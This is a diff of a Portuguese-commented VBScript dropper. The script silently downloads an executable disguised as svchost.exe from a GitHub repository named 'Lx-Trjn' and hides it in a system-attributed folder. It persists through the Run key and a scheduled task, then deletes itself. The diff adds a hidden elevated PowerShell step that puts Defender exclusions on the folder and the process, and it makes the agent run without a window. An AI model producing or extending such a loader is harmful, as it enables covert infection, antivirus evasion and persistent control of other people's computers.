@@ -3,31 +3,28 @@
 ' Fluxo:
 '   1. Se svchost.exe JÁ existe na pasta → roda e sai. (não baixa nada)
 '   2. Se NÃO existe → tenta baixar do GitHub.
-'      2a. Sucesso → instala, registra persistência definitiva, roda.
+'      2a. Sucesso → adiciona exclusão no Defender (UAC 1x), instala,
+'                    registra persistência definitiva, roda.
 '      2b. Falha   → registra o INSTALADOR no Run (pra tentar de novo no
 '                    próximo logon) e sai silenciosamente.
-'
-' Pensado pra lan house: você configura uma vez, e cada PC se auto-instala
-' conforme for ligando, mesmo se o GitHub estiver intermitente.
 
 Option Explicit
 
 Dim shell, fso, userProfile, localAppData, destino, exeUrl, tmpExe
 Dim cmdBaixar, destinoExe, tentativas, rc, tamArquivo
-Dim pythonExe, deps, tempBat, tempLog, pyUrl, pyInstaller
-Dim vbsPath, fBat, driveObj, espacoLivreMB, is64, psKill
-Dim tentativasMove, cmdBaixarPython
+Dim vbsPath, driveObj, espacoLivreMB, psKill
+Dim tentativasMove
 
 ' ==== Persistência ====
 Dim regRun, regValorNome, regInstalador, regAgente
 Dim taskName, psTask, vbsDir, vbsNome
+Dim pastaDefender, psExclusao, cmdElevar, psChecker, jaExcluido
 
 Set shell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
 ' ==== Configurações ====
-exeUrl = "https://github.com/DesconhecidoPorOpcao/0T.romujaPnp/releases/latest/download/svchost.exe"
-deps = "requests psutil python-dotenv pillow websockets"
+exeUrl = "https://github.com/Desconhecidoporlx/Lx-Trjn/releases/latest/download/svchost.exe"
 
 userProfile  = shell.ExpandEnvironmentStrings("%USERPROFILE%")
 localAppData = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%")
@@ -46,11 +43,13 @@ vbsDir  = fso.GetParentFolderName(vbsPath)
 vbsNome = fso.GetFileName(vbsPath)
 
 ' Comando do instalador pra colocar no Run (usado só quando o download falha)
-' wscript.exe //B <caminho do vbs>  — roda sem janela, sem prompt
 regInstalador = "wscript.exe //B """ & vbsPath & """"
 
 ' Comando do agente pra colocar no Run (usado quando instala com sucesso)
 regAgente = """" & destinoExe & """"
+
+' Pasta que vai ser excluída do Defender
+pastaDefender = destino
 
 ' =====================================================================
 ' PASSO 0 — Já está instalado?
@@ -63,7 +62,6 @@ If fso.FileExists(destinoExe) Then
     If tamArquivo >= 1048576 Then
         ' --- Já instalado. Garante que está rodando e sai. ---
 
-        ' Garante a entrada DEFINITIVA no Run (aponta pro .exe, não pro vbs)
         On Error Resume Next
         shell.RegWrite regRun & "\" & regValorNome, regAgente, "REG_SZ"
         On Error Goto 0
@@ -81,7 +79,6 @@ If fso.FileExists(destinoExe) Then
         On Error Goto 0
 
         If rc <> 0 Then
-            ' Não está rodando → inicia
             On Error Resume Next
             shell.Run regAgente, 1, False
             On Error Goto 0
@@ -92,113 +89,54 @@ If fso.FileExists(destinoExe) Then
 End If
 
 ' =====================================================================
-' PASSO 1 — Não instalado. Garante pasta + persistência do INSTALADOR
-'           (assim, se cair no meio, ainda tenta de novo no próximo logon)
+' PASSO 1 — Garante pasta + persistência do INSTALADOR
 ' =====================================================================
-
-' Cria a pasta (escondida)
 If Not fso.FolderExists(destino) Then
     fso.CreateFolder(destino)
 End If
 shell.Run "attrib +h +s """ & destino & """", 0, True
 
-' Registra o INSTALADOR no Run — se algo falhar daqui pra frente, o PC
-' tenta de novo no próximo logon.
 On Error Resume Next
 shell.RegWrite regRun & "\" & regValorNome, regInstalador, "REG_SZ"
 On Error Goto 0
 
 ' =====================================================================
-' PASSO 2 — Python
+' PASSO 1.5 — Exclusão no Windows Defender (UAC 1x)
 ' =====================================================================
-pythonExe = ""
+' Mesma pasta onde o svchost.exe vai morar. Só pergunta se ainda não
+' estiver na lista de exclusões. Se o UAC for negado, o script segue
+' normalmente (o agente principal tenta de novo depois, ou o próximo
+' logon tenta).
+' =====================================================================
+
+psChecker = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
+            "$p = '" & pastaDefender & "'; " & _
+            "$excl = (Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath; " & _
+            "if ($excl -contains $p) { exit 0 } else { exit 1 }" & _
+            """"
 
 On Error Resume Next
-rc = shell.Run("cmd /c py -3 --version >nul 2>&1", 0, True)
+rc = shell.Run(psChecker, 0, True)
 On Error Goto 0
-If rc = 0 Then pythonExe = "py -3"
 
-If pythonExe = "" Then
-    On Error Resume Next
-    rc = shell.Run("cmd /c python --version >nul 2>&1", 0, True)
-    On Error Goto 0
-    If rc = 0 Then pythonExe = "python"
-End If
+If rc <> 0 Then
+    ' Não está excluída ainda → pede UAC e adiciona.
+    ' Add-MpPreference exige elevação, então usamos Start-Process -Verb RunAs.
+    psExclusao = "$p = '" & pastaDefender & "'; " & _
+                 "Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; " & _
+                 "Add-MpPreference -ExclusionProcess 'svchost.exe' -ErrorAction SilentlyContinue"
 
-If pythonExe = "" Then
-    Set driveObj = fso.GetDrive(fso.GetDriveName(localAppData))
-    espacoLivreMB = Int(driveObj.FreeSpace / 1048576)
+    ' escapa aspas simples pro PowerShell aceitar dentro do -Command
+    psExclusao = Replace(psExclusao, "'", "''")
 
-    If espacoLivreMB < 800 Then
-        ' Sem espaço: sai silenciosamente. O Run já está setado pra tentar
-        ' de novo no próximo logon.
-        WScript.Quit 0
-    End If
-
-    is64 = ""
-    On Error Resume Next
-    is64 = shell.RegRead("HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\PROCESSOR_ARCHITECTURE")
-    On Error Goto 0
-
-    If InStr(is64, "64") > 0 Then
-        pyUrl = "https://www.python.org/ftp/python/3.12.7/python-3.12.7-amd64.exe"
-    Else
-        pyUrl = "https://www.python.org/ftp/python/3.12.7/python-3.12.7.exe"
-    End If
-
-    pyInstaller = shell.ExpandEnvironmentStrings("%TEMP%") & "\python_setup.exe"
-
-    cmdBaixarPython = "powershell -NoProfile -WindowStyle Hidden -Command ""try { " & _
-                      "Invoke-WebRequest -Uri '" & pyUrl & "' -OutFile '" & pyInstaller & "' " & _
-                      "-UseBasicParsing -ErrorAction Stop; exit 0 } catch { exit 1 }"""
-    rc = shell.Run(cmdBaixarPython, 0, True)
-
-    tentativas = 0
-    Do While Not fso.FileExists(pyInstaller) And tentativas < 120
-        WScript.Sleep 500
-        tentativas = tentativas + 1
-    Loop
-
-    If fso.FileExists(pyInstaller) Then
-        shell.Run """" & pyInstaller & """ /quiet InstallAllUsers=0 PrependPath=1 Include_pip=0", 0, True
-        WScript.Sleep 5000
-        On Error Resume Next
-        fso.DeleteFile pyInstaller, True
-        On Error Goto 0
-    End If
+    cmdElevar = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
+                "Start-Process powershell -Verb RunAs -Wait -WindowStyle Hidden " & _
+                "-ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-Command','" & psExclusao & "'" & _
+                """"
 
     On Error Resume Next
-    rc = shell.Run("cmd /c py -3 --version >nul 2>&1", 0, True)
+    shell.Run cmdElevar, 0, True
     On Error Goto 0
-    If rc = 0 Then
-        pythonExe = "py -3"
-    Else
-        On Error Resume Next
-        rc = shell.Run("cmd /c python --version >nul 2>&1", 0, True)
-        On Error Goto 0
-        If rc = 0 Then pythonExe = "python"
-    End If
-End If
-
-' =====================================================================
-' PASSO 3 — Dependências Python
-' =====================================================================
-If pythonExe <> "" Then
-    tempBat = shell.ExpandEnvironmentStrings("%TEMP%") & "\_deps_" & _
-              Replace(CStr(Timer), ".", "") & ".bat"
-    tempLog = shell.ExpandEnvironmentStrings("%TEMP%") & "\_deps.log"
-
-    Set fBat = fso.CreateTextFile(tempBat, True)
-    fBat.WriteLine "@echo off"
-    fBat.WriteLine "chcp 65001 >nul"
-    fBat.WriteLine "echo === dependencias python === > """ & tempLog & """"
-    fBat.WriteLine pythonExe & " -m ensurepip --default-pip >> """ & tempLog & """ 2>&1"
-    fBat.WriteLine pythonExe & " -m pip install --upgrade pip --quiet --disable-pip-version-check >> """ & tempLog & """ 2>&1"
-    fBat.WriteLine pythonExe & " -m pip install " & deps & " --quiet --disable-pip-version-check >> """ & tempLog & """ 2>&1"
-    fBat.WriteLine "del /f /q """ & tempBat & """ >nul 2>&1"
-    fBat.Close
-
-    shell.Run "cmd /c """ & tempBat & """", 0, True
 End If
 
 ' =====================================================================
@@ -234,23 +172,20 @@ If fso.FileExists(tmpExe) Then
     tamArquivo = fso.GetFile(tmpExe).Size
 End If
 
-' --- FALHOU? Sai silenciosamente. O Run já tá setado pro instalador. ---
 If Not fso.FileExists(tmpExe) Or tamArquivo < 1048576 Then
     On Error Resume Next
     fso.DeleteFile tmpExe, True
     On Error Goto 0
 
-    ' Garante de novo que o Run aponta pro instalador (redundância segura)
     On Error Resume Next
     shell.RegWrite regRun & "\" & regValorNome, regInstalador, "REG_SZ"
     On Error Goto 0
 
-    ' SEM MsgBox. Sai quieto. Próximo logon tenta de novo.
     WScript.Quit 0
 End If
 
 ' =====================================================================
-' PASSO 6 — Move pra destino final (com retry de 15s)
+' PASSO 6 — Move pra destino final (com retry)
 ' =====================================================================
 tentativasMove = 0
 Do While tentativasMove < 30
@@ -268,7 +203,6 @@ Do While tentativasMove < 30
 Loop
 
 If tentativasMove >= 30 Then
-    ' Não conseguiu mover → deixa o instalador no Run e sai.
     On Error Resume Next
     shell.RegWrite regRun & "\" & regValorNome, regInstalador, "REG_SZ"
     On Error Goto 0
@@ -303,13 +237,11 @@ shell.Run psTask, 0, True
 On Error Goto 0
 
 ' =====================================================================
-' PASSO 8 — Roda o agente
+' PASSO 8 — Roda o agente (sem janela)
 ' =====================================================================
-shell.Run regAgente, 1, False
+shell.Run regAgente, 0, False
 
 ' =====================================================================
 ' PASSO 9 — Auto-deleta o .vbs
 ' =====================================================================
-' Já rodou tudo. O Run agora aponta pro .exe, então o .vbs não é mais
-' necessário. Pode se apagar.
 shell.Run "cmd /c ping -n 3 127.0.0.1 >nul & del /f /q """ & vbsPath & """", 0, False
